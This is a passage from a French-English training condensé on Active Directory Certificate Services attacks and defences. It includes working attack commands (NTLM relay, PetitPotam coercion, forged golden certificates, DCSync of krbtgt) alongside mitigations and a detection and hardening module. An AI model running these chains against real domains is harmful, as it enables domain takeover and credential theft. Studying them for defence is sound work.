- Disable HTTP enrollment (use HTTPS avec EPA)
- Block incoming NTLM authentication vers CA
- Patch KB5014754+

```powershell
# Enable EPA (Post-patch)
# IIS Manager → certsrv site → Authentication → Windows Authentication → Advanced Settings → Extended Protection: Required
```

---

## 📚 MODULE 19: ESC11 - IF_ENFORCEENCRYPTICERTREQUEST

### Vulnerability

**IF_ENFORCEENCRYPTICERTREQUEST Flag**:
- Contrôle si certificate request doit être encrypted
- Si disabled = requests peuvent être relayed

**Combined avec**:
- RPC enrollment interface
- NTLM authentication support

### Attack

Similar à ESC8 mais abuse RPC enrollment au lieu HTTP:

```bash
# Relay vers RPC enrollment
python3 ntlmrelayx.py -t rpc://ca-server -smb2support --adcs --template Machine

# Coerce authentication
# Obtain certificate
```

### Mitigation

- Enable `IF_ENFORCEENCRYPTICERTREQUEST` flag
- Disable NTLM sur CA
- Patch KB5014754+

```powershell
# Check flag
certutil -getreg ca\InterfaceFlags

# Enable (requires CA restart)
certutil -setreg ca\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
Restart-Service certsvc
```

---

## 📚 MODULE 20: SSH AUTHENTICATION AVEC CERTIFICATS

### Concept

**OpenSSH Certificate-Based Authentication**:
- SSH supporte authentication via certificats
- Si AD-integrated SSH deployé
- Certificats AD peuvent être used pour SSH auth

### Configuration

**SSH CA Setup**:
1. Generate SSH CA key pair
2. Configure sshd pour trust CA public key
3. Issue user SSH certificates signed par CA

**AD Integration**:
- Template: **SSH User** ou custom
- EKU: SSH Client (custom OID)
- SAN: SSH username

### Exploitation

**Si vulnerable template (ESC1-like)**:
```powershell
# Request SSH certificate
.\Certify.exe request /ca:CA /template:SSH /altname:root@ssh-server

# Extract SSH certificate from X.509
# Convert PFX to SSH format
ssh-keygen -i -m PKCS8 -f private.key > ssh.key

# Authenticate
ssh -i ssh.key root@ssh-server
```

### Mitigation

- Separate SSH CA from AD CS
- Restrict SSH template enrollment
- Validate SSH certificate SAN

---

## 📚 MODULE 21: VPN CBA & LINUX CERT STORAGE

### VPN avec Certificate-Based Authentication

**Concept**: VPN (Cisco AnyConnect, OpenVPN, etc.) peut utiliser certificats AD pour authentication

**Attack**:
- Si vulnerable template accessible
- Request certificat avec SAN = privileged VPN user
- Access VPN network avec high privs

```powershell
# Request certificate
.\Certify.exe request /ca:CA /template:VPN /altname:vpnadmin@domain.com

# Configure VPN client avec certificate
# Connect avec admin access
```

### Linux Certificate Storage

**Locations**:
- `~/.pki/nssdb/`: Firefox/Chrome cert DB
- `/etc/pki/`: System certs
- `~/.ssh/`: SSH keys/certs
- Custom applications

**Extraction**:
```bash
# Firefox NSS DB
pk12util -o cert.pfx -n "certificate_name" -d sql:$HOME/.pki/nssdb

# OpenSSL
openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem
```

**Usage**:
```bash
# Certipy authentication
certipy auth -pfx cert.pfx -dc-ip DC_IP

# OU convert pour Rubeus
# Transfer to Windows
.\Rubeus.exe asktgt /user:user /certificate:cert.pfx /ptt
```

---

## 📚 MODULE 22: ESC7.1 - MANAGECA PERMISSION

### Vulnerability

**ManageCA Permission**:
- Permet manage CA configuration
- Peut enable dangerous settings (EDITF_ATTRIBUTESUBJECTALTNAME2)
- Approve pending certificate requests

### Enumération

```powershell
# Certify
.\Certify.exe find /vulnerable

# Chercher: ManageCA permission pour notre user

# Manual check
certutil -config "CA\CA-NAME" -getreg ca\OfficerRights
```

### Exploitation Scenario 1: Enable EDITF_ATTRIBUTESUBJECTALTNAME2

```powershell
# Enable flag
certutil -config "CA\CA-NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

# Restart CA (requires local admin OU Manage Certificates right)
Invoke-Command -ComputerName CA-SERVER -ScriptBlock {Restart-Service certsvc}

# Now ANY template peut être abused avec SAN
.\Certify.exe request /ca:CA /template:User /altname:administrator

# Cleanup
certutil -config "CA\CA-NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

### Exploitation Scenario 2: Approve Pending Requests

**Si SubCA template ou Manager Approval template**:

```powershell
# Step 1: Request certificate (will be pending)
.\Certify.exe request /ca:CA /template:SubCA

# Output: Request ID = 123

# Step 2: Approve avec ManageCA permission
certutil -config "CA\CA-NAME" -resubmit 123

# Step 3: Retrieve approved certificate
certutil -config "CA\CA-NAME" -retrieve 123 approved.cer

# Download certificate
.\Certify.exe download /ca:CA /id:123
```

### Exploitation Scenario 3: Grant ManageCertificates Permission

**Manage Certificates** + pending request = full control:

```powershell
# Grant ManageCertificates to self (requires ManageCA)
# Via CA MMC: CA Properties → Security → Add user → Allow Issue and Manage Certificates

# Then exploit comme Scenario 2
```

### Mitigation

- Restrict ManageCA permissions
- Monitor CA configuration changes
- Alert on EDITF_ATTRIBUTESUBJECTALTNAME2 enable
- Event 4899: Certificate Services configuration changed

---

## 📚 MODULE 23: TRUSTING CA CERTIFICATES & DPERSIST1

### DPERSIST1: Trusting Malicious CA

**Concept**: Add malicious CA certificate to NTAuthCertificates store → tous certificats signed trusted pour AD auth

**NTAuthCertificates Store**:
- Location: `CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local`
- Contient CA certificates trusted pour AD authentication
- Replicated à tous DCs

### Prerequisites

- **Write permission** sur NTAuthCertificates container
- OU **Enterprise Admin** (par défaut EA seul peut modifier)

### Attack

**Step 1: Generate Malicious CA**:
```bash
# OpenSSL
openssl req -new -x509 -days 3650 -keyout ca.key -out ca.crt -subj "/CN=Malicious CA"
```

**Step 2: Add to NTAuthCertificates**:
```powershell
# Via certutil (requires EA)
certutil -dspublish -f ca.crt NTAuthCertificates

# OU via PowerShell
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("ca.crt")
Get-ADObject -Identity "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" | Set-ADObject -Add @{cACertificate=$cert.RawData}
```

**Step 3: Forge Certificates**:
```powershell
# ForgeCert avec notre malicious CA
.\ForgeCert.exe --CaCertPath malicious-ca.pfx --CaCertPassword password --Subject "CN=Administrator" --SubjectAltName administrator@domain.com --NewCertPath admin.pfx --NewCertPassword password

# Authenticate
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt
```

### Persistence Value

- Valide tant que malicious CA dans NTAuthCertificates
- Peut forger certificats pour ANY user
- Survit password resets, account deletions

### Mitigation

- Restrict Write sur NTAuthCertificates (EA seulement)
- Monitor modifications (Event 5136)
- Audit NTAuthCertificates contents régulièrement
- Certificate chain validation

---

## 📚 MODULE 24: AZURE PRIVILEGE ESCALATION (CBA)

### Azure AD Certificate-Based Authentication

**Concept**: Azure AD supporte CBA pour user authentication

**Configuration**:
- Certificate uploaded à Azure AD
- User account configured avec certificate mapping
- CBA policy enabled

### Exploitation

**Scenario: Hybrid Environment**:

**Step 1: Compromise On-Prem AD CS**:
```powershell
# Obtain certificate pour on-prem account
.\Certify.exe request /ca:CA /template:VulnTemplate /altname:admin@domain.com
```

**Step 2: Use pour Azure AD Auth** (si synced account):
```bash
# Azure CLI avec certificate
az login --service-principal --username APP_ID --tenant TENANT_ID --certificate cert.pfx

# OU Graph API
# POST to https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
# avec client_assertion = JWT signed avec certificate
```

**Scenario: Azure AD Joined Device**:

**If device certificate compromised**:
```powershell
# Export device certificate
.\SharpDPAPI.exe certificates /machine

# Use pour authentication comme device
# Then pivot to user accounts on device
```

### Azure AD CBA Persistence

**Add Certificate to Azure AD User**:
```powershell
# Requires Global Admin / Privileged Authentication Admin
# Azure Portal → User → Authentication Methods → Certificate

# OU via Graph API
POST https://graph.microsoft.com/v1.0/users/{userId}/authentication/certificates
{
  "certificateData": "BASE64_CERT"
}
```

### Mitigation

- Separate Azure AD CBA CA from on-prem CA
- Conditional Access policies
- Monitor certificate additions to Azure AD users
- MFA enforcement même avec CBA

---

## 📚 MODULE 25: DEFENSE - PREVENTION & DETECTION

### Prevention Measures

**1. Hardening Certificate Templates**:
- **Remove** CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (SAN)
- **Enable** Manager Approval pour sensitive templates
- **Require** Authorized Signatures
- **Restrict** enrollment permissions (Groups, not individual users)
- **Avoid** "Any Purpose" EKU
- **Set** appropriate validity periods

**2. CA Configuration**:
- **Disable** EDITF_ATTRIBUTESUBJECTALTNAME2
  ```powershell
  certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
  ```
- **Enable** IF_ENFORCEENCRYPTICERTREQUEST
  ```powershell
  certutil -setreg ca\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
  ```
- **Enable** Extended Protection for Authentication (EPA) sur HTTP enrollment
- **Restrict** ManageCA, ManageCertificates permissions

**3. Strong Certificate Mapping**:
```powershell
# Enable Strong Certificate Binding
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement" -Value 2

# Configure Certificate Mapping Methods
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\SecurityProviders\Schannel" -Name "CertificateMappingMethods" -Value 0x18
```

**4. ACL Restrictions**:
- Review et restrict permissions sur:
  - Certificate Templates container
  - Individual templates
  - CA objects
  - NTAuthCertificates
- Principle of Least Privilege

**5. Disable HTTP Enrollment**:
```powershell
# Use HTTPS only
# Disable HTTP site in IIS
```

### Detection - Event IDs

**Certificate Enrollment**:
- **4886**: Certificate Services received certificate request
- **4887**: Certificate Services approved and issued certificate
- **4888**: Certificate Services denied certificate request

**CA Configuration Changes**:
- **4899**: Certificate Services template security updated
- **4900**: Certificate Services template security updated (per-property)

**Certificate Template Changes**:
- **5136**: Directory Service object modified (template)
- **5137**: Directory Service object created (new template)

**NTAuthCertificates Changes**:
- **5136**: Directory Service object modified (NTAuthCertificates)

**Key Trust (Shadow Credentials)**:
- **5136**: msDS-KeyCredentialLink modified

**Certificate Export**:
- **4886** + **4887** combinés avec short time delta = automated attack

### Detection Logic

**ESC1/ESC2/ESC3 Detection**:
```
Event 4887 (Issued Certificate)
  AND
Requester != Subject (from certificate)
  AND
Template allows SAN
```

**ESC4/ESC5 Detection**:
```
Event 5136 (Template/CA Modified)
  AND
Actor not in authorized admin group
  AND
Property = msPKI-Certificate-Name-Flag OR EditFlags
```

**Shadow Credentials**:
```
Event 5136
  AND
ObjectClass = user OR computer
  AND
AttributeLDAPDisplayName = msDS-KeyCredentialLink
  AND
Actor != SYSTEM
```

**Golden Certificate**:
```
Event 4876 (Backup CA private key)
  OR
Event 4877 (Restore CA private key)
  AND
Actor not in authorized backup operators
```

### Monitoring Tools

**1. Certify**:
```powershell
# Audit mode
.\Certify.exe find /vulnerable
.\Certify.exe find /showAllPermissions

# Regular execution → baseline vulnerable templates
```

**2. PSPKIAudit**:
```powershell
# PowerShell module for AD CS auditing
Import-Module PSPKIAudit
Get-PKIAudit -Verbose
```

**3. ADCSTemplate Auditor**:
- Custom scripts monitoring template changes
- Alert on dangerous permission grants

**4. SIEM Integration**:
- Forward Events 4886, 4887, 4899, 5136
- Correlation rules pour attack patterns
- Baseline normal certificate issuance

### Certificate Revocation

**Emergency Response**:
```powershell
# Revoke compromised certificate
certutil -revoke SERIAL_NUMBER

# Publish new CRL
certutil -CRL

# OU via CA MMC
# Revoked Certificates → All Tasks → Revoke Certificate
```

**Mass Revocation** (si compromise CA):
```powershell
# Revoke all certificates from specific template
certutil -view -restrict "CertificateTemplate=TemplateName" -out "Serial Number"
# Then revoke each serial

# OU disable template
# CA MMC → Certificate Templates → Disable
```

### Incident Response Plan

**1. Detection Phase**:
- Alert on suspicious cert requests
- Identify compromised template/CA

**2. Containment**:
- Disable vulnerable template
- Revoke suspicious certificates
- Block attacker account

**3. Eradication**:
- Patch templates (remove SAN, add approval)
- Restrict permissions
- Change CA configuration

**4. Recovery**:
- Issue new certificates pour legitimate users
- Update CRL
- Monitor for re-compromise

**5. Lessons Learned**:
- Document attack path
- Update detection rules
- Improve baseline security

### Hardening Checklist

- [ ] Audit all templates avec Certify
- [ ] Remove SAN from non-essential templates
- [ ] Enable Manager Approval où possible
- [ ] Restrict enrollment permissions
- [ ] Disable EDITF_ATTRIBUTESUBJECTALTNAME2
- [ ] Enable Strong Certificate Binding
- [ ] Enable EPA sur web enrollment
- [ ] Restrict ManageCA permissions
- [ ] Audit NTAuthCertificates contents
- [ ] Setup SIEM monitoring (4886, 4887, 4899, 5136)
- [ ] Document authorized certificate administrators
- [ ] Regular ACL audits
- [ ] Certificate lifecycle management
- [ ] Incident response plan documented
- [ ] Backup CA private key securely

---

## 🔧 OUTILS RÉFÉRENCES

### C# Tools
- **Certify**: https://github.com/GhostPack/Certify (enumeration, exploitation)
- **Certificer**: Alternative Certify
- **ForgeCert**: https://github.com/GhostPack/ForgeCert (Golden Certificate)
- **Whisker**: https://github.com/eladshamir/Whisker (Shadow Credentials)
- **Rubeus**: https://github.com/GhostPack/Rubeus (authentication)
- **SharpDPAPI**: https://github.com/GhostPack/SharpDPAPI (certificate export)

### Python Tools
- **Certipy**: https://github.com/ly4k/Certipy (all-in-one AD CS tool)
- **PyWhisker**: Python version Whisker
- **ntlmrelayx**: Impacket (ESC8 relay)
- **PetitPotam**: https://github.com/topotam/PetitPotam (coerce auth)

### Built-in Windows
- **certutil.exe**: CA management, certificate operations
- **certreq.exe**: Certificate requests
- **certmgr.msc**: User certificate store
- **certlm.msc**: Computer certificate store

---

## 📖 ATTACK CHAINS EXAMPLES

### Chain 1: ESC1 → Domain Admin

```powershell
# 1. Enumeration
.\Certify.exe find /vulnerable

# 2. Request avec SAN
.\Certify.exe request /ca:CA\CA-NAME /template:VulnTemplate /altname:administrator

# 3. Convert PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# 4. Authenticate
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt

# 5. DCSync
.\Mimikatz.exe "lsadump::dcsync /user:domain\krbtgt"
```

### Chain 2: Shadow Credentials → Computer Account → DCSync

```powershell
# 1. Find GenericWrite on DC
Get-DomainObjectAcl -Identity DC01 -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|WriteProperty"}

# 2. Add Shadow Credential
.\Whisker.exe add /target:DC01$

# 3. Authenticate as DC
.\Rubeus.exe asktgt /user:DC01$ /certificate:BASE64_CERT /ptt

# 4. DCSync
.\Mimikatz.exe "lsadump::dcsync /user:domain\krbtgt"
```

### Chain 3: ESC8 (Relay) → DA

```bash
# 1. Setup relay
python3 ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController

# 2. Coerce DC authentication
python3 PetitPotam.py attacker_ip dc_ip

# 3. Retrieve certificate
certipy auth -pfx dc.pfx -dc-ip DC_IP

# 4. Use NT hash pour DCSync
secretsdump.py -hashes :HASH domain/dc$@dc_ip
```

### Chain 4: ESC4 (Vulnerable ACL) → ESC1

```powershell
# 1. Find WriteProperty on template
.\Certify.exe find /showAllPermissions

# 2. Modify template
Set-ADObject -Identity "CN=TemplateName,CN=Certificate Templates,..." -Replace @{msPKI-Certificate-Name-Flag=1}

# 3. Exploit comme ESC1
.\Certify.exe request /ca:CA /template:TemplateName /altname:administrator
```

### Chain 5: Golden Certificate → Permanent Persistence

```powershell
# 1. Compromise CA (DA required)
.\Mimikatz.exe "crypto::capi" "crypto::cng" "crypto::keys /export"

# 2. Export CA cert + private key
.\SharpDPAPI.exe certificates /machine /mkfile:ca.key

# 3. Forge certificate (offline, anytime)
.\ForgeCert.exe --CaCertPath ca.pfx --SubjectAltName admin@domain.com --NewCertPath admin.pfx

# 4. Authenticate (even after password changes)
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt
```

---

## 🎯 COMMAND QUICK REFERENCE

### Enumération
```powershell
# Liste CAs
certutil -TCAInfo
.\Certify.exe cas

# Templates vulnérables
.\Certify.exe find /vulnerable

# Current user enrollment rights
.\Certify.exe find /currentuser

# Template details
certutil -v -template TemplateName
```

### Exploitation
```powershell
# ESC1 - Request avec SAN
.\Certify.exe request /ca:CA /template:Template /altname:admin@domain.com

# ESC3 - Enrollment Agent
.\Certify.exe request /ca:CA /template:EnrollmentAgent
.\Certify.exe request /ca:CA /template:User /onbehalfof:domain\admin /enrollcert:agent.pfx

# Shadow Credentials
.\Whisker.exe add /target:targetuser
.\Rubeus.exe asktgt /user:targetuser /certificate:BASE64_CERT /ptt

# Authentication
.\Rubeus.exe asktgt /user:user /certificate:cert.pfx /password:pass /ptt
```

### Certificate Management
```powershell
# Export user certificate
Get-ChildItem Cert:\CurrentUser\My
Export-PfxCertificate -Cert $cert -FilePath cert.pfx -Password $pass

# Export machine certificate (as SYSTEM)
.\SharpDPAPI.exe certificates /machine

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### Defense
```powershell
# Check dangerous flags
certutil -getreg policy\EditFlags
certutil -getreg ca\InterfaceFlags

# Disable EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Enable Strong Certificate Binding
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\Kdc -Name StrongCertificateBindingEnforcement -Value 2

# Revoke certificate
certutil -revoke SERIAL_NUMBER
```

---

FIN DU CONDENSÉ AD CS - 25 MODULES COUVERTS ✅
